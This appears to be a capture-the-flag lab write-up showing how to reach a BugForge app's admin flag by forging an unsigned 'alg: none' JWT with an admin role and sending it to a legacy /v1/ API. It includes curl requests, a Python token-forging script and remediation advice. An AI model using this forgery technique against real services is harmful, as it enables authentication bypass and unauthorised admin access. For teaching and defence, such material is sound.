---
title: Sokudo - JWT alg:none on Legacy API
tags:
  - bugforge
  - jwt
  - alg-none
  - api-enumeration
  - broken-access-control
aliases:
  - "/BugForge/Sokudo---JWT-alg-none-on-Legacy-API"
---

- **"Can you find API endpoints on a different path?"**
- The goal is to reach the admin panel and read the flag

## The Big Idea (before we start)

- The app has **two versions** of its API: `/v2/` (the one the website actually uses) and `/v1/` (a hidden older version)
- Legacy APIs are gold mines because they often run older, weaker code that was never patched
- In this case, the `/v1/` API accepts **unsigned JWTs** (`alg: none`) while `/v2/` correctly rejects them

## Step 1 - Register and get a token

- First, create an account so we have a valid JWT to study

```bash
curl -s https://lab-1784737541633-qosebe.labs-app.bugforge.io/v2/register \
  -H "Content-Type: application/json" \
  -d '{"username":"learner","email":"learner@x.io","password":"Pass1234!","full_name":"Learner"}'
```

- You get back a token and a user object:

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJsZWFybmVyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODQ3Mzc3NDF9.PET_ImoBnCaIzeBBHIQq4gHLS5udDzPTYmmUxInwUlE",
  "user": {"id": 4, "username": "learner", "email": "learner@x.io", "full_name": "Learner"}
}
```

## Step 2 - Decode the JWT (understand what you hold)

- A JWT is three base64 strings joined by dots: `header.payload.signature`
- You can decode the first two parts yourself - no tools needed

```bash
echo "eyJpZCI6NCwidXNlcm5hbWUiOiJsZWFybmVyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODQ3Mzc3NDF9" | base64 -d 2>/dev/null
```

- That gives you the payload:

```json
{"id": 4, "username": "learner", "role": "user", "iat": 1784737741}
```

- The `role: "user"` is what stops us from reaching admin endpoints
- The header says `"alg": "HS256"` - that means the server signs tokens with HMAC-SHA256 using a secret key
- To forge a token we would need to know that secret... or find a way around it

## Step 3 - Find the "different path" (the /v1/ API)

- The website only ever calls `/v2/` endpoints - you can see this in the JavaScript
- But the hint says there is a **different path**
- If there is a `/v2/`, there was probably a `/v1/` before it
- Let us probe it:

```bash
curl -s https://lab-1784737541633-qosebe.labs-app.bugforge.io/v1/verify-token \
  -H "Authorization: Bearer <your-token>"
```

- It works! The `/v1/` API is alive and accepts the same token
- Now check if the admin flag endpoint exists on `/v1/` too:

```bash
curl -s https://lab-1784737541633-qosebe.labs-app.bugforge.io/v1/admin/flag \
  -H "Authorization: Bearer <your-token>"
```

```json
{"error": "Admin access required"}
```

- Same 403 as `/v2/` - both versions check the role
- But do they check it the **same way**? That is the real question

## Step 4 - Try the alg:none bypass on /v1/

- Here is the trick: JWT has a header field called `alg` that tells the server how the token was signed
- If you set `alg` to `none`, you are saying "this token is not signed at all"
- A **properly configured** server will reject `alg: none` tokens because unsigned tokens can be forged by anyone
- But an older or misconfigured server might just... accept them
- We already know `/v2/` rejects `alg: none` (it says "Invalid token")
- Let us try it on `/v1/` instead

- Build a forged token with `alg: none`, an admin payload, and **no signature**:

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({
    "id": 1,
    "username": "admin",
    "role": "admin",
    "iat": 1784737741
}).encode())

# Note the trailing dot - that is the empty "signature" for alg:none
forged_token = f"{header}.{payload}."
print(forged_token)
```

- Now send it to the `/v1/` admin flag endpoint:

```bash
curl -s https://lab-1784737541633-qosebe.labs-app.bugforge.io/v1/admin/flag \
  -H "Authorization: Bearer <forged-token>"
```

```json
{"flag": "bug{LQsmKSTITxOGeRv18eVl3PxBNBNbZtKN}"}
```

- There it is
- The `/v1/` API accepted our unsigned, forged admin token
- The `/v2/` API would have rejected it - but the legacy version did not

## Why this works (the short version)

- JWT libraries have historically been bad at rejecting `alg: none`
- Some older versions of popular Node.js JWT libraries (like `jsonwebtoken`) would skip signature verification entirely if the algorithm was set to `none`
- The `/v2/` API was built with a patched library or explicit `algorithms: ['HS256']` enforcement
- The `/v1/` API was never updated, so it still accepts `alg: none`
- This is why **legacy APIs are dangerous** - they keep running with old, vulnerable code long after the fix exists

## Security Takeaways

### Vulnerability
- JWT `alg: none` bypass on a legacy `/v1/` API endpoint

### Type
- Broken Authentication / Broken Access Control (OWASP A07:2021)

### Root Cause
- The `/v1/` API uses an older JWT verification path that does not reject unsigned tokens
- The `/v2/` API correctly enforces `algorithms: ['HS256']` and rejects `alg: none`
- The legacy API was never decommissioned or patched

### Attack Chain
1. Register a normal user on `/v2/register` to confirm the app uses JWTs
2. Decode the JWT - notice the `role` claim and `alg: HS256` header
3. Probe for a legacy `/v1/` API (the hint's "different path")
4. Forge a JWT with `alg: none` and `role: admin` (no signature needed)
5. Send it to `GET /v1/admin/flag` - the legacy API accepts it

### Remediation
1. **Reject `alg: none` explicitly** - always pass `algorithms: ['HS256']` (or your actual algorithm) to the JWT verify call
2. **Decommission legacy APIs** - if `/v1/` is no longer needed, remove it entirely; if it is needed, patch it to the same standard as `/v2/`
3. **Do not trust JWT claims for authorization** - re-validate the user's role server-side on every request, not just from the token
4. **Keep dependencies updated** - the `alg: none` flaw was fixed in `jsonwebtoken` years ago, but old deployments that never upgraded are still vulnerable
